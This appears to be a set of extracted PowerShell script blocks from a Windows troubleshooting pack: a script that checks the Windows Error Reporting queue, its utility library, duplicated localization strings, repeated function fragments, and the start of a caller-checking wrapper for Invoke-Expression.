"# Copyright © 2008, Microsoft Corporation. All rights reserved.\r\n\r\ntrap {break}\r\n\r\n# Include common library\r\n. .\\CL_Utility.ps1\r\n\r\nImport-LocalizedData -BindingVariable localizationString -FileName CL_LocalizationData\r\n\r\n# Troubleshooting WER queue\r\nWrite-DiagProgress -Activity $localizationString.CheckWERQueue\r\n\r\n[double]$freeSpace = Get-FreeSpace\r\n[double]$percentage = Get-Percentage\r\n[string]$userReportPath = Get-UserReportPath\r\n[string]$machineReportPath = Get-MachineReportPath\r\n\r\n[double]$userReportSize = Get-FolderSize $userReportPath\r\n[double]$machineReportSize = Get-FolderSize $machineReportPath\r\n[double]$totalSize = Format-DiskSpaceMB ($userReportSize + $machineReportSize)\r\n\r\n# Reporting\r\n$systemDrive = Get-SystemDriveInfo\r\nif($systemDrive -ne $null) {\r\n    $systemDrive | Select-Object -Property @{Name=$localizationString.driveName;Expression={$_.DeviceID}},@{Name=$localizationString.FreeSpace;Expression={(Format-DiskSpaceGB $_.FreeSpace) + \"GB\"}},@{Name=$localizationString.totalSpace;Expression={(Format-DiskSpaceGB $_.Size) + \"GB\"}} | ConvertTo-Xml | Update-DiagReport -id SystemDriveInfo -Name $localizationString.systemDriveInfo_name -Description $localizationString.systemDriveInfo_description -rid \"RC_WERQueue\"\r\n}\r\n\r\n@{Name=$userReportPath;Space=$userReportSize} | Select-Object -Property @{Name=$localizationString.userReportPath;Expression={$_.Name}},@{Name=$localizationString.userReportSpace;Expression={(Format-DiskSpaceMB $_.Space) + \"MB\"}} | ConvertTo-Xml | Update-DiagReport -id UserReprotInfo -Name $localizationString.UserReportInfo_name -Description $localizationString.UserReportInfo_description -rid \"RC_WERQueue\"\r\n\r\n@{Name=$machineReportPath;Space=$machineReportSize} | Select-Object -Property @{Name=$localizationString.MachineReportPath;Expression={$_.Name}},@{Name=$localizationString.MachineReportSpace;Expression={(Format-DiskSpaceMB $_.Space) + \"MB\"}} | ConvertTo-Xml | Update-DiagReport -id AdminReprotInfo -Name $localizationString.MachineReportInfo_name -Description $localizationString.MachineReportInfo_description -rid \"RC_WERQueue\"\r\n\r\nif((($freeSpace + $userReportSize) -gt 0) -and ($percentage -ge 0)) {\r\n    if(($userReportSize / ($freeSpace + $userReportSize)) * 100 -gt $percentage) {\r\n        Update-Diagrootcause -ID \"RC_WERQueue\" -Detected $true -Parameter @{'UnwantedSpace'=(Format-DiskSpaceMB $totalSize)}\r\n        return\r\n    }\r\n}\r\n\r\nif((($freeSpace + $machineReportSize) -gt 0) -and ($percentage -ge 0)) {\r\n    if(($machineReportSize / ($freeSpace + $machineReportSize) * 100 -gt $percentage)) {\r\n        Update-DiagRootcause -ID \"RC_WERQueue\" -Detected $true -Parameter @{'UnwantedSpace'=(Format-DiskSpaceMB $totalSize)}\r\n        return\r\n    }\r\n}\r\n\r\nUpdate-DiagRootcause -ID \"RC_WERQueue\" -Detected $false -Parameter @{'UnwantedSpace'=(Format-DiskSpaceMB $totalSize)}\r\n"
"# Copyright © 2008, Microsoft Corporation. All rights reserved.\r\n\r\n\r\n#Common utility functions\r\nImport-LocalizedData -BindingVariable localizationString -FileName CL_LocalizationData\r\n\r\n# Function to get user troubleshooting history\r\nfunction Get-UserTSHistoryPath {\r\n    return \"${env:localappdata}\\diagnostics\"\r\n}\r\n\r\n# Function to get admin troubleshooting history\r\nfunction Get-AdminTSHistoryPath {\r\n    return \"${env:localappdata}\\elevateddiagnostics\"\r\n}\r\n\r\n# Function to get user report folder path\r\nfunction Get-UserReportPath {\r\n    return \"${env:localappdata}\\Microsoft\\Windows\\WER\\ReportQueue\"\r\n}\r\n\r\n# Function to get system report folder path\r\nfunction Get-MachineReportPath {\r\n    return \"${env:AllUsersProfile}\\Microsoft\\Windows\\WER\\ReportQueue\"\r\n}\r\n\r\n# Function to get threshold to check whether a folder is old\r\nfunction Get-ThresholdForCheckOlderFile {\r\n    [int]$threshold = -1\r\n    return $threshold\r\n}\r\n\r\n# Function to get threshold for deleting WER folder\r\nfunction Get-ThresholdForFileDeleting() {\r\n    [string]$registryEntryPath = \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\"\r\n    [string]$registryEntryName = \"PurgeThreshholdValueInKB\"\r\n    [double]$defaultValue = 10.0\r\n\r\n    return Get-RegistryValue $registryEntryPath $registryEntryName $defaultValue\r\n}\r\n\r\n# Function to get the size of a directory in kb\r\nfunction Get-FolderSize([string]$folder = $(throw \"No folder is specified\")) {\r\n    if([String]::IsNullOrEmpty($folder) -or (-not(Test-Path $folder))) {\r\n        return 0\r\n    }\r\n\r\n    if(-not $Global:DirectoryObject) {\r\n        $Global:DirectoryObject = New-Object -comobject \"Scripting.FileSystemObject\"\r\n    }\r\n\r\n    return ($Global:DirectoryObject.GetFolder($folder).Size) / 1kb\r\n}\r\n\r\n# Function to delete a folder\r\nfunction Delete-Folder([string]$folder = $(throw \"No folder is specified\")) {\r\n    if([String]::IsNullOrEmpty($folder) -or (-not(Test-Path $folder))) {\r\n        return\r\n    }\r\n\r\n    Remove-Item -literalPath $folder -Recurse -Force\r\n}\r\n\r\n# Function to delete old folders\r\nfunction Delete-OldFolders($folder=$(throw \"No folder is specified\")) {\r\n    if(($folder -eq $null) -or (-not(Test-Path $folder))) {\r\n        return\r\n    }\r\n\r\n    [int]$threshold = Get-ThresholdForCheckOlderFile\r\n    $folders = Get-ChildItem -LiteralPath ($folder.FullName) -Force | Where-Object {$_.PSIsContainer}\r\n    if($folders -ne $null) {\r\n        foreach($folder in $folders) {\r\n            if((($folder.CreationTime).CompareTo((Get-Date).AddMonths($threshold))) -lt 0) {\r\n                Delete-Folder ($folder.FullName)\r\n            } else {\r\n                Delete-OldFolders (Get-Item ($folder.FullName))\r\n            }\r\n        }\r\n    }\r\n}\r\n\r\n# Function to get registry value\r\nfunction Get-RegistryValue([string]$registryEntryPath = $(throw \"No registry entry path is specified\"), [string]$registryEntryName = $(throw \"No registry entry name is specified\"), [double]$defaultValue = 0.0) {\r\n    [double]$registryEntryValue = $defaultValue\r\n\r\n    $registryEntry = Get-ItemProperty -Path $registryEntryPath -Name $registryEntryName\r\n    if($registryEntry -ne $null) {\r\n        $registryEntryValue = $registryEntry.$registryEntryName\r\n    }\r\n\r\n\treturn $registryEntryValue\r\n}\r\n\r\n# Function to get the percentage that WER queue can take up\r\nfunction Get-Percentage() {\r\n    [string]$registryEntryPath = \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\"\r\n    [string]$registryEntryName = \"MaxQueueSizePercentage\"\r\n    [double]$defaultValue = 100.0\r\n\r\n    return Get-RegistryValue $registryEntryPath $registryEntryName $defaultValue\r\n}\r\n\r\n# Function to get free disk space on machine\r\nfunction Get-FreeSpace {\r\n    [double]$freeSpace = 0.0\r\n    [string]$wql = \"SELECT * FROM Win32_LogicalDisk WHERE MediaType=12\"\r\n    $drives = Get-WmiObject -query $wql\r\n    if($null -ne $drives) {\r\n        foreach($drive in $drives) {\r\n            $freeSpace += ($drive.freeSpace)\r\n        }\r\n    }\r\n\r\n    return ($freeSpace / 1KB)\r\n}\r\n\r\n# Function to get all unnecessary files\r\nfunction Get-UnnecessaryFiles([string]$folder = $(throw \"No folder is specified\")) {\r\n    if([String]::IsNullOrEmpty($folder) -or (-not(Test-Path $folder))) {\r\n        return $null\r\n    }\r\n\r\n    [int]$threshold = Get-ThresholdForCheckOlderFile\r\n\r\n    return (Get-ChildItem -literalPath $folder -Recurse -Force | Where-Object {($_.PSIsContainer) -and ((($_.CreationTime).CompareTo((Get-Date).AddMonths($threshold))) -lt 0)})\r\n}\r\n\r\n# Function to format disk space (KB -> MB)\r\nfunction Format-DiskSpaceMB([double]$space = $(throw \"No space is specified\")) {\r\n    return [string]([Math]::Round(($space / 1KB), 3))\r\n}\r\n\r\n# Function to format disk space (B -> GB)\r\nFunction Format-DiskSpaceGB([double]$space = $(throw \"No space is specified\")) {\r\n    return [string]([Math]::Round(($space / 1GB), 3))\r\n}\r\n\r\n# Function to attach item to the list with delimiter \"/\"\r\nfunction AttachTo-List([string]$list = $(throw \"No list is specified\"), [string]$item = $(throw \"No item is specified\"))\r\n{\r\n    if([String]::IsNullOrEmpty($list))\r\n    {\r\n        return $item\r\n    }\r\n\r\n    if([String]::IsNullOrEmpty($item))\r\n    {\r\n        return $list\r\n    }\r\n\r\n    return $list + \"/\" + $item\r\n}\r\n\r\n# Function to parse the the list with delimiter \"/\"\r\nfunction Parse-List([string]$list = $(throw \"No list is specified\"))\r\n{\r\n    if($list -eq $null)\r\n    {\r\n        return $null\r\n    }\r\n\r\n    return $list.Split(\"/\", [StringSplitOptions]::RemoveEmptyEntries)\r\n}\r\n\r\n# Function to get list length\r\nfunction Get-ListLength([string]$list = $(throw \"No list is specified\"))\r\n{\r\n    if($list -eq $null)\r\n    {\r\n        return 0\r\n    }\r\n\r\n    $result = Parse-List $list\r\n\r\n    if($result -is [string])\r\n    {\r\n        return 1\r\n    }\r\n    elseif($result -is [object[]])\r\n    {\r\n        return $result.count\r\n    }\r\n    else\r\n    {\r\n        return 0\r\n    }\r\n}\r\n\r\n# Function to convert to WQL path\r\nfunction ConvertTo-WQLPath([string]$wqlPath = $(throw \"No WQL path is specified\"))\r\n{\r\n    if($wqlPath -eq $null)\r\n    {\r\n        return \"\"\r\n    }\r\n\r\n    return $wqlPath.Replace(\"\\\", \"\\\\\")\r\n}\r\n\r\n# Function to check whether the shortcut is valid\r\nfunction Test-ValidLink([Wmi]$wmiLinkFile = $(throw \"No WMI link file is specified\"))\r\n{\r\n    if(($wmiLinkFile -eq $null) -or ([String]::IsNullOrEmpty($wmiLinkFile.Target)))\r\n    {\r\n        return $false\r\n    }\r\n\r\n    return Test-Path $wmiLinkFile.Target\r\n}\r\n\r\n# Function to chech whether have permission to delete the shortcut file\r\nfunction Test-Delete([Wmi]$wmiLinkFile = $(throw \"No WMI link file is specified\"))\r\n{\r\n    if($wmiLinkFile -eq $null)\r\n    {\r\n        return $false\r\n    }\r\n\r\n    return ($wmiLinkFile.AccessMask -band 0x10000) -eq 0x10000\r\n}\r\n\r\n# Function to get desktop path\r\nfunction Get-DesktopPath()\r\n{\r\n$methodDefinition = @\"\r\n    public static string GetDesktopPath\r\n    {\r\n        get\r\n        {\r\n            return Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);\r\n        }\r\n    }\r\n\"@\r\n\r\n    $type = Add-Type -MemberDefinition $methodDefinition -Name \"DesktopPath\" -PassThru\r\n\r\n    return $type::GetDesktopPath\r\n}\r\n\r\n# Function to get startup path\r\nfunction Get-StartupPath()\r\n{\r\n$methodDefinition = @\"\r\n    public static string GetStartupPath\r\n    {\r\n        get\r\n        {\r\n            return Environment.GetFolderPath(Environment.SpecialFolder.Startup);\r\n        }\r\n    }\r\n\"@\r\n\r\n    $type = Add-Type -MemberDefinition $methodDefinition -Name \"StartupPath\" -PassThru\r\n\r\n    return $type::GetStartupPath\r\n}\r\n\r\n# Function to remove all files in the list\r\nfunction Remove-FileList([string]$list = $(throw \"No list is specified\"))\r\n{\r\n    if([String]::IsNullOrEmpty($list))\r\n    {\r\n        return\r\n    }\r\n\r\n    try\r\n    {\r\n        Parse-List $list | Foreach-Object {\r\n            if(-not([String]::IsNullOrEmpty($_)))\r\n            {\r\n                Remove-Item $_ -Force\r\n            }\r\n        }\r\n    }\r\n    catch\r\n    {\r\n        $_ | ConvertTo-Xml | Update-DiagReport -id DeleteFileExceptions -Name $localizationString.filesFailToRemove_name -Description $localizationString.filesFailToRemove_description -Verbosity Warning\r\n    }\r\n}\r\n\r\n# Function to get the last access time of an Icon\r\nfunction Get-LastAccessTime([string]$filePath = $(throw \"No file path is specified\"))\r\n{\r\n    if([String]::IsNullOrEmpty($filePath) -or -not(Test-Path $filePath))\r\n    {\r\n        throw \"No file path found\"\r\n    }\r\n\r\n$typeDefinition = @\"\r\n\r\nusing System;\r\nusing System.Collections.Generic;\r\nusing System.Runtime.InteropServices;\r\nusing ComType = System.Runtime.InteropServices.ComTypes;\r\n\r\npublic sealed class FileInfo\r\n{\r\n    private FileInfo()\r\n    {\r\n    }\r\n\r\n    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]\r\n    struct UAINFO\r\n    {\r\n        internal int cbSize;\r\n        internal int dwMask;\r\n        internal float R;\r\n        internal uint cLaunches;\r\n        internal uint cSwitches;\r\n        internal int dwTime;\r\n        internal ComType.FILETIME ftExecute;\r\n        [MarshalAs(UnmanagedType.Bool)] internal bool fExcludeFromMFU;\r\n\r\n        internal UAINFO(int dwMask)\r\n        {\r\n            this.cbSize = Marshal.SizeOf(typeof(UAINFO));\r\n            this.dwMask = dwMask;\r\n            this.R = 0;\r\n            this.cLaunches = 0;\r\n            this.cSwitches = 0;\r\n            this.dwTime = 0;\r\n            this.ftExecute = new ComType.FILETIME();\r\n            this.fExcludeFromMFU = false;\r\n        }\r\n    }\r\n\r\n    internal const int UAIM_FILETIME = 1;\r\n    internal static Guid UAIID_SHORTCUTS = new Guid(\"F4E57C4B-2036-45F0-A9AB-443BCFE33D9F\");\r\n\r\n    [ComImport, Guid(\"90D75131-43A6-4664-9AF8-DCCEB85A7462\"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]\r\n    interface IShellUserAssist\r\n    {\r\n        int FireEvent(ref Guid pguidGrp, int eCmd, string pszPath, int dwTimeElapsed);\r\n        int QueryEntry(ref Guid pguidGrp, string pszPath, ref UAINFO pui);\r\n        int SetEntry(ref Guid pguidGrp, string pszPath, ref UAINFO pui);\r\n        int RenameEntry(ref Guid pguidGrp, string pszFrom, string pszTo);\r\n        int DeleteEntry(ref Guid pguidGrp, string pszPath);\r\n        int Enable(bool fEnable);\r\n    }\r\n\r\n    [ComImport, Guid(\"DD313E04-FEFF-11d1-8ECD-0000F87A470C\")]\r\n    internal class UserAssist { }\r\n\r\n    public static DateTime GetLastAccessTime(string filePath)\r\n    {\r\n        if(String.IsNullOrEmpty(filePath))\r\n        {\r\n            throw new ArgumentException(\"The file path is null or empty\");\r\n        }\r\n\r\n        UAINFO uaInfo = new UAINFO(UAIM_FILETIME);\r\n        IShellUserAssist iShellUserAssist = new UserAssist() as IShellUserAssist;\r\n        if (iShellUserAssist == null)\r\n        {\r\n            throw new InvalidOperationException(\"Can't get iShellUserAssist interface\");\r\n        }\r\n\r\n        try\r\n        {\r\n            Marshal.ThrowExceptionForHR(iShellUserAssist.QueryEntry(ref UAIID_SHORTCUTS, filePath, ref uaInfo));\r\n        }\r\n        catch\r\n        {\r\n            throw new InvalidOperationException(\"Can't query info about\" + filePath);\r\n        }\r\n\r\n        long fileTime = (((long)uaInfo.ftExecute.dwHighDateTime) << 32) + uaInfo.ftExecute.dwLowDateTime;\r\n\r\n        return DateTime.FromFileTime(fileTime);\r\n    }\r\n}\r\n\"@\r\n\r\n    $type = Add-Type -TypeDefinition $typeDefinition -PassThru\r\n\r\n    return $type[0]::GetLastAccessTime($filePath)\r\n}\r\n\r\n# Function to check whether the icon is pointing to a file\r\nfunction Test-FileShortcut([Wmi]$wmiLinkFile = $(throw \"No wmi link file is specified\"))\r\n{\r\n    if($wmiLinkFile -eq $null)\r\n    {\r\n        return $false\r\n    }\r\n\r\n    [string]$target = $wmiLinkFile.Target\r\n    if([String]::IsNullOrEmpty($target) -or -not(Test-Path $target))\r\n    {\r\n        return $false\r\n    }\r\n\r\n    return -not((Get-Item $target).PSIsContainer)\r\n}\r\n\r\n# Function to create a choice in interaction page\r\nfunction Get-Choice([string]$name = $(throw \"No choice name is specified\"), [string]$description = $(throw \"No choice description is specified\"),\r\n                   [string]$value = $(throw \"No choice value is specified\"), [xml]$extension)\r\n{\r\n    return @{\"Name\"=$name;\"Description\"=$description;\"Value\"=$value;\"ExtensionPoint\"=$extension.InnerXml}\r\n}\r\n\r\n# Function to check whether the current machine is domain joined\r\nFunction Test-DomainJoined()\r\n{\r\n    return (Get-WmiObject -query \"select * from win32_ntdomain where Status ='OK'\") -ne $null\r\n}\r\n\r\n# Function to update time source\r\nFunction Update-TimeSource([string]$timeSource = $(throw \"No time source is specified\"))\r\n{\r\n    w32tm.exe /config /update /manualpeerlist:\"$timeSource\"\r\n}\r\n\r\n# Function to get system drive info\r\nfunction Get-SystemDriveInfo() {\r\n    [string]$wql = \"SELECT * FROM Win32_LogicalDisk WHERE MediaType=12 AND Name = '\" + ${env:systemdrive} + \"'\"\r\n    return Get-WmiObject -query $wql\r\n}\r\n\r\n# Function to get time service status\r\nfunction Get-ServiceStatus([string]$serviceName=$(throw \"No service name is specified\")) {\r\n   [bool]$startService = $true\r\n\r\n   [WMI]$timeService = @(Get-WmiObject -Query \"Select * From Win32_Service Where Name = `\"$serviceName`\"\")[0]\r\n   if($null -ne $timeService) {\r\n      [ServiceProcess.ServiceControllerStatus]$timeServicesStatus = (Get-Service $serviceName).Status\r\n      if(([ServiceProcess.ServiceControllerStatus]::Stopped -eq $timeServicesStatus) -or ([ServiceProcess.ServiceControllerStatus]::StopPending -eq $timeServicesStatus)) {\r\n         $startService = $false\r\n      }\r\n   }\r\n\r\n   return $startService\r\n}\r\n\r\n# Function to wait for expected service status\r\nfunction WaitFor-ServiceStatus([string]$serviceName=$(throw \"No service name is specified\"), [ServiceProcess.ServiceControllerStatus]$serviceStatus=$(throw \"No service status is specified\")) {\r\n    [ServiceProcess.ServiceController]$sc = New-Object \"ServiceProcess.ServiceController\" $serviceName\r\n    [TimeSpan]$timeOut = New-Object TimeSpan(0,0,0,5,0)\r\n    $sc.WaitForStatus($serviceStatus, $timeOut)\r\n}"
"# Localized\t12/07/2019 05:47 AM (GMT)\t303:6.40.20520 \tCL_LocalizationData.psd1\r\nConvertFrom-StringData @'\r\n###PSLOC\r\nfilesFailToRemove_description=Exceptions caught while removing files.\r\ncheckBrokenDesktopShortcuts_progress=Checking for broken shortcuts...\r\ncheckBrokenStartupShortcuts_progress=Checking for broken startup links...\r\nbrokenDesktopShortcuts_name=Broken desktop shortcuts\r\nbrokenDesktopShortcuts_description=List of desktop shortcuts for which the target executable no longer exists.\r\nbrokenStartupShortcuts_name=Broken startup shortcuts\r\nbrokenStartupShortcuts_description=List of startup shortcuts for which the target executable no longer exists.\r\ndeleteBrokenDesktopShortcuts_progress=Deleting broken shortcuts...\r\ndeleteBrokenStartupShortcuts_progress=Deleting broken startup links...\r\ncheckSystemTime_progress=Checking clock time...\r\nsyncSystemTime_progress=Synchronizing clock time...\r\ntimeDelayAgainstTimeServer_name=Clock synchronization\r\ncheckUnusedDesktopIcons_progress=Checking for unused desktop icons...\r\nunusedDesktopShortcuts_name=Unused desktop shortcuts\r\nunusedDesktopShortcuts_description=List of shortcuts that have not been recently accessed for\r\nunusedTimeUnit=months.\r\ndeleteUnusedDesktopShortcuts_progress=Deleting unused shortcuts...\r\ntimeServerName=Time server name\r\nsamplesCollected=Samples collected\r\nserverTime=Server time\r\nlocalTime=Local time\r\ntimeDifference=Time difference\r\nshortcutName=Shortcut name\r\nCheckWERQueue=Checking for unnecessary files...\r\nDeleteUserWERQueue=Deleting Windows error reports...\r\nDeleteSystemWERQueue=Deleting Windows error reports...\r\nCheckTSHistory=Checking for unnecessary files...\r\nDeleteUserTSHistory=Deleting troubleshooting history...\r\nDeleteAdminTSHistory=Deleting troubleshooting history...\r\nfreeSpace=Free space\r\ntotalSpace=Total space\r\ndriveName=Drive name\r\nsystemDriveInfo_name=Disk information\r\nsystemDriveInfo_description=Details of the system drive.\r\nUserReportInfo_name=User Report details\r\nUserReportInfo_description=Details of the Windows error reporting user queue.\r\nuserReportPath=Folder name\r\nuserReportSpace=Disk space\r\nMachineReportInfo_name=System report details\r\nMachineReportInfo_description=Details of the Windows error reporting system queue.\r\nMachineReportPath=Folder name\r\nMachineReportSpace=Disk space\r\nreclaimedUserReportSize=Reclaimed space\r\nReclaimedUserReportInfo_name=Deleted user reports\r\nReclaimedUserReportInfo_description=Details of the updated Windows error reporting user queue.\r\nreclaimedMachineReportSize=Reclaimed space\r\nReclaimedMachineReportInfo_name=Deleted system reports\r\nReclaimedMachineReportInfo_description=Details of the updated Windows error reporting system queue.\r\nuserTSHistoryPath=Folder name\r\nadminTSHistoryPath=Folder name\r\nUserTSHistoryInfo_name=User troubleshooting history details\r\nUserTSHistoryInfo_description=Details of the user troubleshooting history logs.\r\nAdminTSHistoryInfo_name=Administrator troubleshooting history details\r\nAdminTSHistoryInfo_description=Details of the administrator troubleshooting history logs.\r\nReclaimedUserTSHistroyInfo_name=Deleted user troubleshooting history\r\nReclaimedUserTSHistroyInfo_description=Details of the updated user troubleshooting history folder.\r\nReclaimedAdminTSHistroyInfo_name=Deleted administrator troubleshooting history\r\nReclaimedAdminTSHistroyInfo_description=Details of the updated administrator troubleshooting history folder.\r\nuserTSHistorySize=Disk space\r\nadminTSHistorySize=Disk space\r\n###PSLOC\r\n'@\r\n"
"# Localized\t12/07/2019 05:47 AM (GMT)\t303:6.40.20520 \tCL_LocalizationData.psd1\r\nConvertFrom-StringData @'\r\n###PSLOC\r\nfilesFailToRemove_description=Exceptions caught while removing files.\r\ncheckBrokenDesktopShortcuts_progress=Checking for broken shortcuts...\r\ncheckBrokenStartupShortcuts_progress=Checking for broken startup links...\r\nbrokenDesktopShortcuts_name=Broken desktop shortcuts\r\nbrokenDesktopShortcuts_description=List of desktop shortcuts for which the target executable no longer exists.\r\nbrokenStartupShortcuts_name=Broken startup shortcuts\r\nbrokenStartupShortcuts_description=List of startup shortcuts for which the target executable no longer exists.\r\ndeleteBrokenDesktopShortcuts_progress=Deleting broken shortcuts...\r\ndeleteBrokenStartupShortcuts_progress=Deleting broken startup links...\r\ncheckSystemTime_progress=Checking clock time...\r\nsyncSystemTime_progress=Synchronizing clock time...\r\ntimeDelayAgainstTimeServer_name=Clock synchronization\r\ncheckUnusedDesktopIcons_progress=Checking for unused desktop icons...\r\nunusedDesktopShortcuts_name=Unused desktop shortcuts\r\nunusedDesktopShortcuts_description=List of shortcuts that have not been recently accessed for\r\nunusedTimeUnit=months.\r\ndeleteUnusedDesktopShortcuts_progress=Deleting unused shortcuts...\r\ntimeServerName=Time server name\r\nsamplesCollected=Samples collected\r\nserverTime=Server time\r\nlocalTime=Local time\r\ntimeDifference=Time difference\r\nshortcutName=Shortcut name\r\nCheckWERQueue=Checking for unnecessary files...\r\nDeleteUserWERQueue=Deleting Windows error reports...\r\nDeleteSystemWERQueue=Deleting Windows error reports...\r\nCheckTSHistory=Checking for unnecessary files...\r\nDeleteUserTSHistory=Deleting troubleshooting history...\r\nDeleteAdminTSHistory=Deleting troubleshooting history...\r\nfreeSpace=Free space\r\ntotalSpace=Total space\r\ndriveName=Drive name\r\nsystemDriveInfo_name=Disk information\r\nsystemDriveInfo_description=Details of the system drive.\r\nUserReportInfo_name=User Report details\r\nUserReportInfo_description=Details of the Windows error reporting user queue.\r\nuserReportPath=Folder name\r\nuserReportSpace=Disk space\r\nMachineReportInfo_name=System report details\r\nMachineReportInfo_description=Details of the Windows error reporting system queue.\r\nMachineReportPath=Folder name\r\nMachineReportSpace=Disk space\r\nreclaimedUserReportSize=Reclaimed space\r\nReclaimedUserReportInfo_name=Deleted user reports\r\nReclaimedUserReportInfo_description=Details of the updated Windows error reporting user queue.\r\nreclaimedMachineReportSize=Reclaimed space\r\nReclaimedMachineReportInfo_name=Deleted system reports\r\nReclaimedMachineReportInfo_description=Details of the updated Windows error reporting system queue.\r\nuserTSHistoryPath=Folder name\r\nadminTSHistoryPath=Folder name\r\nUserTSHistoryInfo_name=User troubleshooting history details\r\nUserTSHistoryInfo_description=Details of the user troubleshooting history logs.\r\nAdminTSHistoryInfo_name=Administrator troubleshooting history details\r\nAdminTSHistoryInfo_description=Details of the administrator troubleshooting history logs.\r\nReclaimedUserTSHistroyInfo_name=Deleted user troubleshooting history\r\nReclaimedUserTSHistroyInfo_description=Details of the updated user troubleshooting history folder.\r\nReclaimedAdminTSHistroyInfo_name=Deleted administrator troubleshooting history\r\nReclaimedAdminTSHistroyInfo_description=Details of the updated administrator troubleshooting history folder.\r\nuserTSHistorySize=Disk space\r\nadminTSHistorySize=Disk space\r\n###PSLOC\r\n'@\r\n"
"function Get-FreeSpace {\r\n    [double]$freeSpace = 0.0\r\n    [string]$wql = \"SELECT * FROM Win32_LogicalDisk WHERE MediaType=12\"\r\n    $drives = Get-WmiObject -query $wql\r\n    if($null -ne $drives) {\r\n        foreach($drive in $drives) {\r\n            $freeSpace += ($drive.freeSpace)\r\n        }\r\n    }\r\n\r\n    return ($freeSpace / 1KB)\r\n}"
"function Get-Percentage() {\r\n    [string]$registryEntryPath = \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\"\r\n    [string]$registryEntryName = \"MaxQueueSizePercentage\"\r\n    [double]$defaultValue = 100.0\r\n\r\n    return Get-RegistryValue $registryEntryPath $registryEntryName $defaultValue\r\n}"
"function Get-RegistryValue([string]$registryEntryPath = $(throw \"No registry entry path is specified\"), [string]$registryEntryName = $(throw \"No registry entry name is specified\"), [double]$defaultValue = 0.0) {\r\n    [double]$registryEntryValue = $defaultValue\r\n\r\n    $registryEntry = Get-ItemProperty -Path $registryEntryPath -Name $registryEntryName\r\n    if($registryEntry -ne $null) {\r\n        $registryEntryValue = $registryEntry.$registryEntryName\r\n    }\r\n\r\n\treturn $registryEntryValue\r\n}"
"function Get-UserReportPath {\r\n    return \"${env:localappdata}\\Microsoft\\Windows\\WER\\ReportQueue\"\r\n}"
"function Get-MachineReportPath {\r\n    return \"${env:AllUsersProfile}\\Microsoft\\Windows\\WER\\ReportQueue\"\r\n}"
"function Get-FolderSize([string]$folder = $(throw \"No folder is specified\")) {\r\n    if([String]::IsNullOrEmpty($folder) -or (-not(Test-Path $folder))) {\r\n        return 0\r\n    }\r\n\r\n    if(-not $Global:DirectoryObject) {\r\n        $Global:DirectoryObject = New-Object -comobject \"Scripting.FileSystemObject\"\r\n    }\r\n\r\n    return ($Global:DirectoryObject.GetFolder($folder).Size) / 1kb\r\n}"
"function Format-DiskSpaceMB([double]$space = $(throw \"No space is specified\")) {\r\n    return [string]([Math]::Round(($space / 1KB), 3))\r\n}"
"function Get-SystemDriveInfo() {\r\n    [string]$wql = \"SELECT * FROM Win32_LogicalDisk WHERE MediaType=12 AND Name = '\" + ${env:systemdrive} + \"'\"\r\n    return Get-WmiObject -query $wql\r\n}"
"{$_.DeviceID}"
"{(Format-DiskSpaceGB $_.FreeSpace) + \"GB\"}"
"Function Format-DiskSpaceGB([double]$space = $(throw \"No space is specified\")) {\r\n    return [string]([Math]::Round(($space / 1GB), 3))\r\n}"
"{(Format-DiskSpaceGB $_.Size) + \"GB\"}"
"{$_.Name}"
"{(Format-DiskSpaceMB $_.Space) + \"MB\"}"
"{$_.Name}"
"{(Format-DiskSpaceMB $_.Space) + \"MB\"}"
"\r\n# Caller validation to ensure we are calling from and actual script, and not from a malicious command line\r\nfunction Test-Caller {\r\n    param(\r\n        [Parameter(Mandatory=$true)]\r\n        [System.Management.Automation.CallStackFrame[]]\r\n        $CallStack\r\n    )\r\n    $caller = $CallStack[1]\r\n    $location = $caller.Location\r\n    Write-Verbose -Message $('caller: ' + $location) -Verbose\r\n    if ($location -eq '<No file>') {\r\n        throw 'Invoke-Expression cannot be used in a script'\r\n    }\r\n}\r\n\r\n# Generated with\r\n# $var = New-Object System.Management.Automation.CommandMetadata (Get-Command Invoke-Expression)\r\n# [System.Management.Automation.ProxyCommand]::Create($var) | Out-File .\\Invoke-Expression.ps1\r\nfunction Invoke-Expression {\r\n    [CmdletBinding(HelpUri='https://go.microsoft.com/fwlink/?LinkID=2097030')]\r\nparam(\r\n    [Parameter(Mandatory=$true, Position=0, ValueFromPipeline=$true)]\r\n    [string]\r\n    ${Command})\r\n\r\nbegin\r\n{\r\n    try {\r\n        Test-Caller -CallStack (Get-PSCallStack)\r\n        $outBuffer = $null\r\n        if ($PSBoundParameters.TryGetValue('OutBuffer', [ref]$outBuffer))\r\n        {\r\n            $PSBoundParameters['OutBuffer'] = 1\r\n        }\r\n\r\n        $wrappedCmd = $ExecutionContext.InvokeCommand.GetCommand('Microsoft.PowerShell.Utility\\Invoke-Expression', [System.Management.Automation.CommandTypes]::Cmdlet)\r\n        $scriptCmd = {& $wrappedCmd @PSBoundParameters }\r\n\r\n        $steppablePipeline = $scriptCmd.GetSteppablePipeline($myInvocation.CommandOrigin)\r\n        $steppablePipeline.Begin($PSCmdlet)\r\n    } catch {\r\n        throw\r\n    }\r\n}\r\n\r\nprocess\r\n{\r\n    try {\r\n        $steppablePipeline.Process($_)\r\n    } catch {\r\n        throw\r\n    }\r\n}\r\n\r\nend\r\n{\r\n    try {\r\n        $steppablePipeline.End()\r\n    } catch {\r\n        throw\r\n    }\r\n}\r\n<#\r\n\r\n.ForwardHelpTargetName Microsoft.PowerShell.Utility\\Invoke-Expression\r\n.ForwardHelpCategory Cmdlet\r\n\r\n#>\r\n}\r\n\r\n# Generated with\r\n# $var = New-Object System.Management.Automation.CommandMetadata (Get-Command Invoke-Command)\r\n# [System.Management.Automation.ProxyCommand]::Create($var) | Out-File .\\Invoke-Command.ps1\r\nfunction Invoke-Command {\r\n    [CmdletBinding(DefaultParameterSetName='InProcess', HelpUri='https://go.microsoft.com/fwlink/?LinkID=2096789', RemotingCapability='OwnedByCommand')]\r\n    param(\r\n        [Parameter(ParameterSetName='Session', Position=0)]\r\n        [Parameter(ParameterSetName='FilePathRunspace', Position=0)]\r\n        [ValidateNotNullOrEmpty()]\r\n        [System.Management.Automation.Runspaces.PSSession[]]\r\n        ${Session},\r\n\r\n        [Parameter(ParameterSetName='ComputerName', Position=0)]\r\n        [Parameter(ParameterSetName='FilePathComputerName', 